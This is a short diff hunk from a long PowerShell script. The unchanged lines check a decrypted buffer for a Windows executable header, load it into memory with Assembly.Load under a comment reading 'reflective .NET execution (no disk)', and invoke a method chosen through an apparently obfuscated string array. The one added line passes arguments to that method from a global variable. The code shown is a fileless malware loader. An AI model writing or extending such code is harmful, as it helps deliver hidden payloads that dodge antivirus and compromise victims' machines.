@@ -3092,5 +3092,6 @@ if ($pt.Length -lt 2 -or $pt[0] -ne 0x4D -or $pt[1] -ne 0x5A) {
 # --- reflective .NET execution (no disk) ---
 [string[]]$arg = @()
 if ($args) { $arg = [string[]]$args }
+elseif ($global:RA) { $arg = [string[]]$global:RA }
 $r = [System.Reflection.Assembly]::Load($pt)
 $r.GetType($s[11]).GetMethod($s[12], [Type[]]@([string[]])).Invoke($null, @(,$arg))
